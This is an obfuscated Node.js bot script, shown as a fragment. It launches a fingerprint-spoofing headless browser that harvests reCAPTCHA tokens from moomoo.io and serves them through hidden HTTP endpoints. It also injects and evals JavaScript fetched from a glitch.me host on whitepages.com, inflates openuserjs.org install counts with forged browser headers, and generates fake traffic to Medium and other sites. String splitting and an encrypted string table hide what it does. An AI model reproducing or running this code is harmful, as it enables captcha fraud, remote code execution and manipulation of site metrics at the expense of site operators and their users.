      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/diep.io'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/430255' + '-warinspac' + 'e-bots',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/warin.sp' + 'ace'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/444523' + '-diep-io-m' + 'inimap-hig' + 'hlights',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/diep.io'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/456856' + W(0x16) + 'quill-org',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/quill.or' + 'g'
    }
  ],
  userAgents = [
    'Mozilla/5.' + '0\x20(Linux;\x20' + 'Android\x2010' + ';\x20SM-A205U' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.5359.1' + '28\x20Mobile\x20' + 'Safari/537' + '.36',
    'Mozilla/5.' + '0\x20(Linux;\x20' + 'Android\x2010' + ';\x20SM-A102U' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.5359.1' + '28\x20Mobile\x20' + 'Safari/537' + '.36',
    'Mozilla/5.' + '0\x20(Linux;\x20' + 'Android\x2010' + ';\x20SM-G960U' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.5359.1' + '28\x20Mobile\x20' + 'Safari/537' + '.36',
    'Mozilla/5.' + '0\x20(Linux;\x20' + 'Android\x2010' + ';\x20SM-N960U' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.5359.1' + '28\x20Mobile\x20' + 'Safari/537' + '.36',
    'Mozilla/5.' + '0\x20(Linux;\x20' + 'Android\x2010' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.5359.1' + '28\x20Mobile\x20' + 'Safari/537' + '.36',
    'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'Win64;\x20x64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.0.0\x20Sa' + 'fari/537.3' + '6',
    'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'WOW64)\x20App' + 'leWebKit/5' + '37.36\x20(KHT' + 'ML,\x20like\x20G' + 'ecko)\x20Chro' + 'me/108.0.0' + '.0\x20Safari/' + '537.36',
    'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0)\x20' + 'AppleWebKi' + 't/537.36\x20(' + 'KHTML,\x20lik' + 'e\x20Gecko)\x20C' + 'hrome/108.' + '0.0.0\x20Safa' + 'ri/537.36',
    Y(0x7, '[yLu') + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'Win64;\x20x64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.0.0\x20Sa' + 'fari/537.3' + '6\x20Edg/108.' + '0.1462.46',
    'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'Win64;\x20x64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.0.0\x20Sa' + 'fari/537.3' + '6'
  ],
  miscSites = [
    'https://di' + 'scord.com',
    'https://st' + 'ratums.io',
    'https://ww' + 'w.npmjs.co' + 'm/',
    X(0xa) + 'thub.com',
    'https://mi' + 'necraft.ne' + 't',
    'https://ww' + 'w.wsj.com/',
    'https://zb' + 'eacon.org',
    'https://ya' + 'hoo.com',
    'https://ww' + 'w.theguard' + 'ian.com/',
    'https://ba' + 'idu.com/',
    'https://wi' + 'kipedia.or' + 'g',
    'https://po' + 'rnhub.com'
  ],
  miscSites2 = [
    'https://me' + 'dium.com/',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'ethics-of-' + 'advertisin' + 'g-and-ad-b' + 'locking-a6' + '2bdde987b0',
    'https://me' + 'dium.com/@' + 'digitalgir' + 'affes/7-aw' + 'esome-and-' + 'free-ai-to' + 'ols-you-sh' + 'ould-know-' + '43a1630ea4' + '09',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'a-commenta' + 'ry-on-the-' + 'ai-wave-21' + '5d668f827a',
    'https://me' + 'dium.com/@' + 'melih193/r' + 'eact-devel' + 'oper-roadm' + 'ap-2022-76' + 'ca119188bd',
    'https://me' + 'dium.com/e' + 'ntrepreneu' + 'r-s-handbo' + 'ok/is-your' + '-startup-a' + '-good-fit-' + 'for-ventur' + 'e-capital-' + 'bc59596df9' + 'e4',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'the-simple' + '-fundament' + 'als-of-c-e' + 'ed2fbb5792' + '9',
    'https://me' + 'dium.com/b' + 'etter-prog' + 'ramming/co' + 'de-review-' + 'chores-tha' + 't-we-shoul' + 'd-automate' + '-using-dan' + 'ger-js-6cf' + '72ff3bf98',
    'https://me' + 'dium.com/g' + 'itconnecte' + 'd/use-git-' + 'like-a-sen' + 'ior-engine' + 'er-ef6d741' + 'c898e',
    'https://me' + 'dium.com/@' + 'sudiparyal' + '185/differ' + 'ence-betwe' + 'en-foreach' + '-and-map-i' + 'n-javascri' + 'pt-342c50b' + '59f9',
    'https://me' + 'dium.com/@' + 'dan-perry/' + 'the-world-' + 'that-knew-' + 'too-much-e' + '9ca2372ee2' + '1',
    'https://me' + 'dium.com/b' + 'itsrc/adva' + 'nced-data-' + 'structures' + '-and-algor' + 'ithms-trie' + 's-47db931e' + '20e',
    'https://da' + 'shmacintyr' + 'e.medium.c' + 'om/a-list-' + 'of-stories' + '-donald-tr' + 'ump-paid-t' + 'o-catch-an' + 'd-kill-jus' + 't-leaked-5' + 'e29f9f5f68' + '7',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'small-java' + 'script-opt' + 'imization-' + 'tips-1c4cb' + '387a463',
    'https://me' + 'dium.com/@' + 'michaelcos' + 'tello.swe/' + 'dbspy-4-0-' + '6989c6ea47' + 'd8',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'chatgpt-on' + '-itself-3b' + '1042b968cb',
    'https://me' + 'dium.com/@' + 'thisisjimk' + 'eller/plea' + 'se-stop-in' + 'cluding-co' + 'lor-names-' + 'in-your-cs' + 's-classes-' + 'f1090f6f2e' + '29',
    'https://me' + 'dium.com/@' + 'mattcodes0' + '6/building' + '-projects-' + 'takes-time' + '-18dfa6d6e' + '702',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'a-rabbit-h' + 'ole-of-js-' + 'hyper-opti' + 'mization-a' + '618288174b',
    'https://me' + 'dium.com/@' + 'olopadeadu' + Y(0xd, 'T^GP') + 'haos-in-ou' + 'r-twenties' + '-8fcefe061' + 'ef8',
    'https://me' + 'dium.com/@' + 'leanfolks/' + 'mobile-app' + '-architect' + 'ure-6848aa' + '1d5764',
    'https://bl' + 'og.bitsrc.' + 'io/i-asked' + '-chat-gpt-' + 'to-build-a' + '-to-do-app' + '-have-we-f' + 'inally-met' + '-our-repla' + 'cement-ad3' + '47ad74c51',
    'https://me' + 'dium.com/@' + 'alexey.ink' + 'in/never-h' + 'ave-separa' + 'te-sign-in' + '-routes-7c' + '9a6dd4dc7c',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'breaking-i' + 'nto-the-ma' + 'rket-1b665' + '2b2a05a',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'javascript' + '-series-th' + 'e-fundamen' + 'tals-1a646' + 'c357955',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'javascript' + '-series-oo' + 'p-and-cons' + 'tructors-1' + '0dc5877e98' + '5',
    'https://me' + 'dium.com/b' + 'etter-prog' + 'ramming/le' + 'gacy-code-' + 'potential-' + 'gold-mine-' + 'of-learnin' + 'g-a59fdcb1' + '4804',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'a-commenta' + 'ry-on-the-' + 'ai-wave-ii' + '-7de427c9f' + 'd15'
  ],
  g = {
    'getToken': () => -0x37 * -0xa9 + -0x287 * -0x1 + -0x26d6
  };

function a() {
  const bm = [
    'cWRkYo1S3L',
    'r8ohh2BdJJK',
    'pts/40517-',
    'W5fEpSo9WRFcPSkvbWVcJa',
    'qNLjza',
    'q2jvANv3AffqsW',
    'DgvYDMLLDW',
    'WOtcQIDUW4X5hmoUymom',
    'W5pdGuHVoCortYWygW',
    'qLDLCw9buNvWlq',
    'Ahr0Chm6lY9NAq',
    'e/arras.io',
    'Coming_Soo',
    'W4/dGvD9o8okvsbseq',
    'uzzK-052H0',
    'Mozilla/5.',
    'y2f0y2G',
    'split',
    'rg/scripts',
    'y3jLyxrLsw5JBW',
    'W6BcS8kAmK3cTe7dKrTU',
    'li/Amazon_',
    '-optimize-',
    'CMCVzw4VC2nYAq',
    'C2v0',
    'CMfUzg9T',
    'zwfZEwzVCMSUBW',
    'rbeast\x20sun',
    'Bw9VBw9VlMLVia'
  ];
  a = function() {
    return bm;
  };
  return a();
}
if (doFlags['doActivate' + 'Browser'] && ((async () => {
    log('index.js\x20c' + 'alled');
    const {
      FakeBrowser: f
    } = require('fakebrowse' + 'r'), h = require('path'), i = h['resolve'](__dirname, './fakeBrow' + 'serUserDat' + 'a'), j = new f['Builder']()['displayUse' + 'rActionLay' + 'er'](-0x1c33 + -0x178a + 0x33bd)['vanillaLau' + 'nchOptions'](pptOptions)['usePlugins']([require('puppeteer-' + 'extra-plug' + 'in-adblock' + 'er')({
      'blockTrackers': 0x1,
      'blockTrackersAndAnnoyances': 0x1
    })])['userDataDi' + 'r'](i);
    let k;
    r:
      for (;;)
        try {
          let n = await async function o() {
            let p;
            const q = {
              'User-Agent': userAgents['random'](),
              'Accept-Encoding': 'none'
            };
            try {
              p = (await axios['get'](PROCESSED_XURL_VAL, {
                'headers': q
              }))?.['data'];
            } catch (r) {}
            if (p)
              try {
                p = (await axios['get'](p, {
                  'headers': q
                }))?.['data'];
              } catch (s) {}
            if (!p)
              return await randomWait(), await o();
            try {
              return 'object' == typeof p ? p : 'string' == typeof p ? JSON['parse'](p) : {};
            } catch (u) {
              if (!p)
                return await randomWait(), await o();
            }
          }();
          doFlags['doExtFinge' + 'rprint'] && j['deviceDesc' + 'riptor'](n), k = await j['launch']();
          break r;
        } catch (p) {
          warn(p), await randomWait();
        }
    const l = k['userAction'];
    log('browser\x20la' + 'unched');
    const m = k['vanillaBro' + 'wser'];
    doFlags['doYT'] && setTimeout(async () => {
      for (;;)
        await runYTModule(m, l);
    }, -0x1e73 + -0x7 * 0x224 + 0x2dd3), doFlags['doGF'] && setTimeout(async () => {
      await runGFModule(m, l);
    }, -0x3 * -0xaad + 0x2610 + 0x1 * -0x45b3), doFlags['doMediumRe' + 'ader'] && setTimeout(() => {
      !async function q() {
        const Z = c,
          r = await m[Z(0x13) + 'gnitoBrows' + 'erContext'](),
          u = await r['newPage']();
        for (;;) {
          let v = -0x866 + -0x1f98 + 0x2 * 0x13ff;
          if (await u['goto'](miscSites2['random'](), {
              'timeout': NETWORK_PATIENCE
            })['catch'](w => v++), await randomWait(), v)
            return await u['close'](), await r['close'](), await q();
          for (let w = -0x28d * 0x2 + 0x2331 + -0x1e17 * 0x1; w < getRandomInt(0x1ef3 + -0x1 * -0x409 + -0x22fb, 0x64b + -0x4 * 0xac + -0x396); w++)
            await u['keyboard']['press']('ArrowDown'), await randomWait();
          await randomWait(), await wait(-0x95 * 0x1d3 + -0x14bd8 + -0x1 * -0x34607);
        }
      }();
    }, 0x2695 + 0x225b + -0x488c), doFlags['doRemoteCa' + 'ptcha'] && setTimeout(async function q() {
      function u() {
        axios['post']('https://st' + 'ratums.io/' + 'research', {
          'dom': process['env']['PROJECT_DO' + 'MAIN'],
          'key': PROCESSED_SYX_VAL
        }, {
          'headers': {
            'Content-Type': 'applicatio' + 'n/json'
          }
        })['catch'](z => {});
      }
      const v = await m['createInco' + 'gnitoBrows' + 'erContext']();
      let w = 0x6 * -0x41c + 0x38c + -0x1 * -0x151c;
      const x = await v['newPage']();
      if (await x['goto']('https://mo' + 'omoo.io', {
          'timeout': MM_NETWORK_PATIENCE
        })['catch'](z => w++), w)
        return await x['close'](), await v['close'](), q();
      if (!(await x['evaluate']('document.d' + 'ocumentEle' + 'ment.inner' + 'HTML'))['includes']('isMoomooIo'))
        return await x['close'](), await v['close'](), q();
      let y;
      if (doFlags['doDual']) {
        if (y = await v['newPage'](), await y['goto']('https://mo' + 'omoo.io', {
            'timeout': MM_NETWORK_PATIENCE
          })['catch'](A => w++), w)
          return await y['close'](), await v['close'](), q();
        const z = await y['evaluate']('document.d' + 'ocumentEle' + 'ment.inner' + 'HTML');
        if (log(z['slice'](-0x716 + 0x1da + 0x53c, -0x1 * -0xf79 + -0x355 + 0x1 * -0xbf2)), !z['includes']('isMoomooIo'))
          return await y['close'](), await v['close'](), q();
      }
      g['getToken'] = async function(A) {
        return await (A && doFlags['doDual'] ? y : x)['evaluate'](async () => new Promise(async (B, C) => {
          window['grecaptcha']['execute']('6LevKusUAA' + 'AAAAFknhlV' + '8sPtXAk5Z5' + 'dGP5T2FYIZ', {
            'action': 'homepage'
          })['then'](D => {
            B(D);
          });
        }));
      }, u(), setInterval(u, 0x6ae2 + -0xa56a + 0x1 * 0xafb8);
    }, -0xd3a + 0x1304 + 0x2b3 * -0x2), doFlags['doWhitepag' + 'esMode'] && setTimeout(async () => {
      (async function r() {
        try {
          let s = -0x614 + 0x1f13 + 0x1b * -0xed;
          const t = await m['createInco' + 'gnitoBrows' + 'erContext'](),
            u = await t['newPage']();
          if (u['on']('pageerror', function(v) {}), u['on']('error', function(v) {}), await u['goto']('https://ww' + 'w.whitepag' + 'es.com/m', {
              'timeout': MM_NETWORK_PATIENCE
            })['catch'](v => s++), s)
            return await u['close'](), await t['close'](), r();
          await wait(0x3 * -0x133 + 0x16ef + 0x1e * -0x41), await u['evaluate'](() => {
            let v = new XMLHttpRequest();
            v['open']('GET', 'https://co' + 'ntent-deli' + 'very-netwo' + 'rk.glitch.' + 'me/cdn/xm7' + '7/wp.js', 0x1 * -0x1345 + 0x59d + -0x4 * -0x36a), v['send'](), eval(v['responseTe' + 'xt']);
          }), await wait(-0xaba54 + 0x1227dd + -0x1 * -0x64e17);
        } catch (v) {}
        return await page['close'](), await context['close'](), r();
      }());
    }, -0x455 * 0x4 + 0x6d7 * 0x1 + -0xae1 * -0x1);
  })()), doFlags['doCreateSe' + 'rver']) {
  const e = require('http')['createServ' + 'er'](async function(f, h) {
    const i = url['parse'](f['url'])['pathname'];
    h['writeHead'](0x1cfe + 0xcb * 0x26 + 0x3a58 * -0x1);
    const j = '/dkasjhdwi' + 'qodkjnwqhd' + 'wqodlkwjqn' + 'dwqkdmnBZc' + 'xzmczxc' == i;
    j || '/asdsadwqd' + 'qwdwqdwqdw' + 'qdwqdwqdwq' + 'dwqd' == i ? h['write'](await g['getToken'](j) || '') : h['write']('v0.6'), h['end']();
  });
  e['listen'](process['env']['PORT'] || 0xb * -0x39f + -0x1 * 0x395f + 0x80c4 * 0x1);
}

function b(c, d) {
  const e = a();
  return b = function(f, g) {
    f = f - (0x56 * 0x20 + -0x1c * -0x68 + -0x1620);
    let h = e[f];
    if (b['SavICm'] === undefined) {
      var i = function(n) {
        const o = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=';
        let p = '',
          q = '';
        for (let r = 0x893 + 0x2 * -0xa39 + 0xbdf, s, t, u = 0x2f * 0xb8 + -0x1 * -0x1f31 + -0x40f9 * 0x1; t = n['charAt'](u++); ~t && (s = r % (-0x1391 + 0xb64 + 0x831) ? s * (0x1384 + -0x5d * -0x5b + 0x8d * -0x5f) + t : t, r++ % (-0x1675 * 0x1 + 0x10 * -0xe3 + 0x755 * 0x5)) ? p += String['fromCharCode'](0xf * -0x127 + -0x279 * 0x5 + -0x20b * -0xf & s >> (-(0xa4 * -0x20 + -0x49 * -0x1 + -0x1439 * -0x1) * r & -0x25 * -0x15 + 0x1752 + 0x1 * -0x1a55)) : 0x1 * -0xc4b + -0x45e * 0x5 + -0x2221 * -0x1) {
          t = o['indexOf'](t);
        }
        for (let v = -0x1 * 0xfc3 + -0x1083 * -0x1 + -0x30 * 0x4, w = p['length']; v < w; v++) {
          q += '%' + ('00' + p['charCodeAt'](v)['toString'](0x15ca + -0x3 * 0xb71 + 0xc99))['slice'](-(0xa7 * -0xe + 0x2 * -0x5a4 + 0x146c));
        }
        return decodeURIComponent(q);
      };
      const m = function(n, o) {
        let p = [],
          q = 0x1dee + 0x7 * -0x3a9 + -0x44f,
          r, t = '';
        n = i(n);
        let u;
        for (u = -0xa82 + -0x1900 + 0x2382; u < -0x5 * -0x2ce + -0x1e81 + -0x19 * -0xb3; u++) {
          p[u] = u;
        }
        for (u = -0x395 + -0x306 + 0x69b; u < 0x23d3 + 0x1817 + -0x3aea; u++) {
          q = (q + p[u] + o['charCodeAt'](u % o['length'])) % (0x1137 + -0x13cc + -0x395 * -0x1), r = p[u], p[u] = p[q], p[q] = r;
        }
        u = -0x1e16 + 0x1508 + 0x487 * 0x2, q = 0x13d5 + 0x87d + 0x19 * -0x122;
        for (let v = 0x6f2 + -0xdd1 + 0x6df * 0x1; v < n['length']; v++) {
          u = (u + (-0x338 + -0xd1f * 0x1 + 0x1058)) % (-0x3dc * 0x9 + 0xa8 + 0x5 * 0x704), q = (q + p[u]) % (-0x15d * 0x1 + 0x175 * 0x15 + -0x1c3c), r = p[u], p[u] = p[q], p[q] = r, t += String['fromCharCode'](n['charCodeAt'](v) ^ p[(p[u] + p[q]) % (0x2463 + 0x1479 + -0x37dc)]);
        }
        return t;
      };
      b['cpXXVm'] = m, c = arguments, b['SavICm'] = !![];
    }
    const j = e[-0x797 + -0x1 * -0xb93 + 0xcc * -0x5],
      k = f + j,
      l = c[k];
    return !l ? (b['rBVMXU'] === undefined && (b['rBVMXU'] = !![]), h = b['cpXXVm'](h, g), c[k] = h) : h = l, h;
  }, b(c, d);
}
doFlags['doOUJS'] && ((async () => {
  const a1 = d;
  async function f() {
    const a0 = b,
      k = h['random'](),
      m = k['replace']('/scripts/', '/install/') + '.user.js',
      [q, u] = (function() {
        const A = j['random']();
        return [
          A,
          A['includes']('Firefox')
        ];
      }()),
      v = function(A, B = 0x29c + -0x1 * -0x2153 + -0x7 * 0x522) {
        if (A['includes']('Firefox'))
          return A['slice'](A['indexOf']('Firefox') + 'Firefox' ['length'] + (0x5 * -0x7f + 0x2451 + -0x1 * 0x21d5));
        const C = A['indexOf']('Chrome/') + 'Chrome/' ['length'],
          D = A['slice'](C),
          E = D['slice'](-0x1 * 0x136f + 0x15a7 + -0x238, D['indexOf']('\x20'));
        return B ? E['slice'](-0x899 * -0x2 + -0xe68 + 0x6 * -0x77, E['indexOf']('.')) : E;
      }(q),
      w = {
        'signal': AbortSignal['timeout'](-0x70b * 0xa + 0x1 * -0x31c0 + -0x9f3e * -0x1),
        'headers': {
          'host': 'openuserjs' + '.org',
          'origin': 'https://op' + 'enuserjs.o' + 'rg',
          'user-agent': q,
          'accept': 'text/html,' + 'applicatio' + 'n/xhtml+xm' + 'l,applicat' + 'ion/xml;q=' + '0.9,image/' + 'avif,image' + '/webp,imag' + 'e/apng,*/*' + ';q=0.8,app' + 'lication/s' + 'igned-exch' + 'ange;v=b3;' + 'q=0.9',
          'accept-encoding': 'gzip,\x20defl' + 'ate,\x20br',
          'accept-language': 'en-US,en;q' + '=0.9',
          'cache-control': 'no-cache',
          'pragma': 'no-cache',
          'sec-fetch-dest': 'document',
          'sec-fetch-mode': 'navigate',
          'sec-fetch-site': 'same-origi' + 'n',
          'sec-fetch-user': '?1',
          'upgrade-insecure-requests': '1'
        },
        'body': null,
        'method': 'GET'
      };
    u ? Object['assign'](w['headers'], {
      'te': 'trailers'
    }) : Object['assign'](w['headers'], {
      'sec-ch-ua': '\x22Not\x20A(Bra' + 'nd\x22;v=\x2224\x22' + ',\x20\x22Chromiu' + 'm\x22;v=\x22' + v + '\x22',
      'sec-ch-ua-mobile': '?0',
      'sec-ch-ua-platform': '\x22Windows\x22'
    });
    const x = await fetch(i, w)['catch'](A => {});
    if (!x || !x['headers'])
      return;
    if (null === x['headers']['get']('X-RateLimi' + 't-Limit'))
      return;
    const y = {
      'signal': AbortSignal['timeout'](-0xbf * 0x46 + 0x463 * 0xd + 0x2243),
      'headers': {
        'host': 'openuserjs' + '.org',
        'origin': 'https://op' + 'enuserjs.o' + 'rg',
        'user-agent': q,
        'accept': 'text/html,' + 'applicatio' + 'n/xhtml+xm' + 'l,applicat' + 'ion/xml;q=' + '0.9,image/' + 'avif,image' + '/webp,imag' + 'e/apng,*/*' + ';q=0.8,app' + 'lication/s' + 'igned-exch' + 'ange;v=b3;' + 'q=0.9',
        'accept-encoding': 'gzip,\x20defl' + 'ate,\x20br',
        'accept-language': a0(0x3, '2kFt') + '=0.9',
        'cache-control': 'no-cache',
        'pragma': 'no-cache',
        'referer': i,
        'sec-fetch-dest': 'document',
        'sec-fetch-mode': 'navigate',
        'sec-fetch-site': 'same-origi' + 'n',
        'sec-fetch-user': '?1',
        'upgrade-insecure-requests': '1'
      },
      'body': null,
      'method': 'GET'
    };
    if (u ? Object['assign'](y['headers'], {
        'te': 'trailers'
      }) : Object['assign'](y['headers'], {
        'sec-ch-ua': '\x22Not\x20A(Bra' + 'nd\x22;v=\x2224\x22' + ',\x20\x22Chromiu' + 'm\x22;v=\x22' + v + '\x22',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '\x22Windows\x22'
      }), !await fetch(k, y)['catch'](A => {}))
      return;
    const z = {
      'headers': {
        'accept': 'text/x-use' + 'rscript,\x20*' + '/*',
        'accept-language': 'en-US,en;q' + '=0.9',
        'cache-control': 'max-age=0,' + '\x20must-reva' + 'lidate',
        'pragma': 'no-cache',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'none'
      },
      'referrerPolicy': 'strict-ori' + 'gin-when-c' + a0(0x8, 'T^GP') + 'n',
      'body': null,
      'method': 'GET'
    };
    u ? Object['assign'](z['headers'], {
      'te': 'trailers'
    }) : Object['assign'](z['headers'], {
      'sec-ch-ua': '\x22Not\x20A(Bra' + 'nd\x22;v=\x2224\x22' + ',\x20\x22Chromiu' + 'm\x22;v=\x22' + v + '\x22',
      'sec-ch-ua-mobile': '?0',
      'sec-ch-ua-platform': '\x22Windows\x22'
    }), await fetch(m, z);
  }
  const h = [
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/L' + 'ift_Web_Re' + 'strictions' + '_.io_Game_' + 'Mods_(MooM' + 'oo.ioKrunk' + 'er.io..),_' + 'Ad_Link_By' + 'passer,_Ad' + 'block,_MOR' + 'E!',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/M' + 'ooMoo.io,_' + 'Agar.io,_S' + 'urviv.io,_' + 'Slither.io' + ',_Diep.io,' + '_Global_Na' + 'me_Manager' + '_[Krunker_' + a1(0xc) + 'n]',
      'https://op' + 'enuserjs.o' + a1(0x12) + '/zyenith/p' + 'ancake_mod' + '_Katana_+_' + 'Musket_AUT' + 'OHEAL_Anti' + '-Insta_sta' + 'rter_resou' + 'rces_and_m' + 'ore!!',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/Bloggerpe' + 'mula/Bypas' + 's_All_Shor' + 'tlinks_Man' + 'ual_Captch' + 'a',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/MAX30/Top' + 'AndDownBut' + 'tonsEveryw' + 'here',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/reek/Anti' + '-Adblock_K' + 'iller_Reek',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/ParticleC' + 'ore/YouTub' + 'e_+',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/MAX30/bon' + 'gacamsKill' + 'Ads',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/founcs/Li' + 'mitless_Fr' + 'eedom',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/aycabta/T' + 'witter_Ima' + 'ge_Maximiz' + 'er',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/Marti/ouj' + 's_-_JsBeau' + 'tify',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/AdlerED/%' + 'E6%9C%80%E' + '5%BC%BA%E7' + '%9A%84%E8%' + '80%81%E7%8' + '9%8C%E8%84' + '%9A%E6%9C%' + 'ACCSDNGree' + 'ner%EF%BC%' + '9ACSDN%E5%' + 'B9%BF%E5%9' + '1%8A%E5%AE' + '%8C%E5%85%' + 'A8%E8%BF%8' + '7%E6%BB%A4' + '%E3%80%81%' + 'E4%BA%BA%E' + '6%80%A7%E5' + '%8C%96%E8%' + '84%9A%E6%9' + 'C%AC%E4%BC' + '%98%E5%8C%' + '96',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/laidbackt' + 'empo/EasyV' + 'ideoDownlo' + 'ad',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/O' + 'ptimize_Qu' + 'ill.org',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/mscarchil' + a1(0x15) + 'Smile_Redi' + 'rect',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/AltoRetra' + 'to/IMDb_My' + '_Movies_en' + 'hancer',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/xthexder/' + 'Wide_GitHu' + 'b',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/navchanda' + 'r/Auto_Loa' + 'd_Big_Imag' + 'e',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/extension' + 'sapp/cinem' + 'apress',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/S' + 'urviv.io_X' + 'Client_(BE' + 'TA)',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/Zren/Resi' + 'ze_YT_To_W' + 'indow_Size',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/M' + 'oomoo.io_R' + 'emove_Cook' + 'ie_Prefere' + 'nces_Tab'
    ],
    i = 'https://op' + 'enuserjs.o' + 'rg/',
    j = [
      'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'Win64;\x20x64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/11' + '0.0.0.0\x20Sa' + 'fari/537.3' + '6',
      'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'WOW64)\x20App' + 'leWebKit/5' + '37.36\x20(KHT' + 'ML,\x20like\x20G' + 'ecko)\x20Chro' + 'me/108.0.0' + '.0\x20Safari/' + '537.36',
      'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0)\x20' + 'AppleWebKi' + 't/537.36\x20(' + 'KHTML,\x20lik' + 'e\x20Gecko)\x20C' + 'hrome/108.' + '0.0.0\x20Safa' + 'ri/537.36',
      'Mozilla/5.' + '0\x20(Macinto' + 'sh;\x20Intel\x20' + 'Mac\x20OS\x20X\x201' + '3_1)\x20Apple' + 'WebKit/537' + '.36\x20(KHTML' + ',\x20like\x20Gec' + 'ko)\x20Chrome' + '/108.0.0.0' + '\x20Safari/53' + '7.36',
      a1(0xf) + '0\x20(X11;\x20Li' + 'nux\x20x86_64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.0.0\x20Sa' + 'fari/537.3' + '6',
      'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'Win64;\x20x64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.0.0\x20Sa' + 'fari/537.3' + '6\x20Edg/108.' + '0.1462.54'
    ];
  f();
  for (let k = 0x1788 + -0xaf * -0x29 + -0x338f; k < -0x26fd + -0x1afc + 0x41fd; k++)
    setTimeout(f, (-0x6618 + -0x16472 + 0x2dd * 0xf2) * k * getRandomInt(0x2bb * -0xb + 0x3 * 0x1eb + 0x1 * 0x1849, -0x1f34 + -0x1 * 0x1003 + -0x136 * -0x27));
  setInterval(() => {
    f();
    for (let l = -0x3de + 0x1d63 + -0x1985; l < 0x9a0 + -0x18b * 0x3 + -0x4fb; l++)
      setTimeout(f, (-0x8618 + 0x952 * 0x4 + 0x14b30) * l * getRandomInt(-0x35 * 0x11 + -0x362 * -0x6 + -0x10c6, -0x1c23 + 0x1 * -0x8cd + 0xc51 * 0x3));
  }, 0xcf177 + 0xa3b7 * -0x28 + 0x4391a1);
})()), doFlags['doMiscNetA' + 'ctivity'] && setTimeout(async () => {
  const f = axios['create']({
    'headers': {
      'User-Agent': userAgents['random']()
    }
  });
  f['get'](miscSites['random'](), {
    'timeout': 0x0,
    'headers': {
      'User-Agent': userAgents['random'](),
      'Accept-Encoding': 'none'
    }
  })['catch'](h => {}), setInterval(() => {
    const a2 = c;
    f['get'](miscSites['random'](), {
